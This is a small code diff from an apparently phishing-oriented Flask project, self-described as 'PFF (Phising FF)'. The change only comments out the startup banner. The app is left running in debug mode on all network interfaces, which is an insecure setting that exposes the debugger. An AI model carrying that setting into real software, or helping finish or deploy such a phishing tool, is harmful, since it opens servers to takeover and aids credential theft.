@@ -19,6 +19,6 @@ def index():
 		return render_template("index.html")
 
 if __name__ == "__main__":
-	print ("         WELCOME TO PFF (Phising FF)")
-	print ("      copyright (c) 20120 BILLAL FAUZAN")
+#	print ("         WELCOME TO PFF (Phising FF)")
+#	print ("      copyright (c) 20120 BILLAL FAUZAN")
 	app.run(debug=True, host="0.0.0.0", port=5000)
